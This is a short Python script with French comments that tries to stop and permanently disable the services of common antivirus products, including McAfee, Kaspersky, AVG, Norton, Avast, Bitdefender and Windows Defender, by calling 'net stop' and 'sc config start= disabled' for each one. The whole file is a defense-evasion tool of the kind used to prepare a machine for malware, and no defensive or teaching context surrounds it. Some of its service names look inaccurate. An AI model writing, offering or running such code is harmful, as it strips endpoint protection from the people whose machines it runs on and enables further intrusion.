import subprocess
import os

def disable_antivirus():
    # Liste des services d'antivirus courants
    antivirus_services = [
        "MCAfee",  # McAfee
        "avp",     # Kaspersky
        "avg",     # AVG
        "norton",  # Norton
        "avast",   # Avast
        "bitdefender",  # Bitdefender
        "msmpeng"  # Windows Defender
    ]

    for service in antivirus_services:
        try:
            # Arrêter le service
            subprocess.run(['net', 'stop', service], check=True)
            print(f"Service {service} arrêté.")
        except subprocess.CalledProcessError as e:
            print(f"Erreur lors de l'arrêt du service {service}: {e}")

        try:
            # Désactiver le service pour qu'il ne redémarre pas au démarrage
            subprocess.run(['sc', 'config', service, 'start=', 'disabled'], check=True)
            print(f"Service {service} désactivé pour le démarrage.")
        except subprocess.CalledProcessError as e:
            print(f"Erreur lors de la désactivation du service {service}: {e}")

if __name__ == "__main__":
    disable_antivirus()